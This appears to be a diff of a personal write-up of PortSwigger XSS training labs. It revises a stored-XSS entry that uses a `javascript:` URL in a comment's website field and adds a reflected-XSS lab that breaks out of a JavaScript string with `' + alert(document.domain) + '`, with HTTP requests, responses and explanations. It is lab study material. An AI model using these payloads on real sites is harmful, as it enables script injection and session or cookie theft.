@@ -411,7 +411,7 @@ Te: trailers
 
 csrf=6gp2ueKRJckPFiQYcod9k1wjXDOlKcat&postId=1&comment=very+useful&name=adam&email=adam%40hello.com&website=abc123
 ```
-Then opened the blog GET request and saw how it stored the comment. Saw that what i wrote on `website` parameter stored in `href` . 
+Then opened the blog GET request and saw how it stored the comment. I saw that whatever I wrote in the `website` parameter was stored directly in the `href` attribute.
 
 #### 📤 Response
 ```http
@@ -426,11 +426,60 @@ Then opened the blog GET request and saw how it stored the comment. Saw that wha
             [...Remaining are omitted...]
 ```
 
-The username is clickable . So I can't inject payload like `<script>` or `<img>` as it will get encoded in href and will not render our payload .
+The username is clickable. I can't inject a payload like `<script>` or `<img>` here, since double quotes are HTML-encoded — I can't break out of the `href` attribute to add a new tag.
 
-So I used this `javascript:alert(document.cookie)` as this is valid when it's starting with `javascript:` so we can click the name execute our payload .
+So I used `javascript:alert(document.cookie)` instead, since this is a valid attribute value starting with `javascript:` — clicking the name executes it as script in the page context.
 
-After sending this I clicked the name and payload worked .
+After submitting this, I clicked the name and the payload worked.
 ```http 
 csrf=6gp2ueKRJckPFiQYcod9k1wjXDOlKcat&postId=1&comment=worth&name=harry&email=harry%40hello.com&website=javascript:alert(document.cookie)
 ```
+
+## Lab 9: Reflected XSS into a JavaScript string with angle brackets HTML-encoded
+
+Searched an alphanumeric string and saw it stored in a JS variable.
+
+#### 📤 Request
+```http
+GET /?search=hello123 HTTP/2
+Host: 0ab80092039f141f803708a900670056.web-security-academy.net
+Cookie: session=REDACTED
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: https://0ab80092039f141f803708a900670056.web-security-academy.net/
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Priority: u=0, i
+Te: trailers
+```
+#### 📤 Response
+```http
+                [...Remaining are omitted...]
+                   <script>
+                        var searchTerms = 'hello123';
+                        document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
+                    </script>
+                    <img src="/resources/images/tracker.gif?searchTerms=hello123">
+                [...Remaining are omitted...]
+```
+To make the payload, I had to build a valid JS expression using an arithmetic operator:
+`' + alert(document.domain) + '`, which gets substituted into the template so the final line reads `'' + alert(document.domain) + ''`.
+
+Here the first `''` is a blank string that gets added (concatenated) with the result of `alert(document.domain)`, and the result of that is added again with another `''` — this keeps the overall statement syntactically valid, so the assignment doesn't throw an error, while `alert(document.domain)` still runs as a side effect during evaluation. Any binary operator (`+`, `-`, etc.) works the same way here, since the arithmetic result itself is never used — only the fact that `alert()` gets called along the way matters.
+
+#### 📤 Response
+```http
+                [...Remaining are omitted...]
+                   <script>
+                        var searchTerms = '' + alert(document.domain) + '';
+                        document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
+                    </script>
+                [...Remaining are omitted...]
+```
+
+
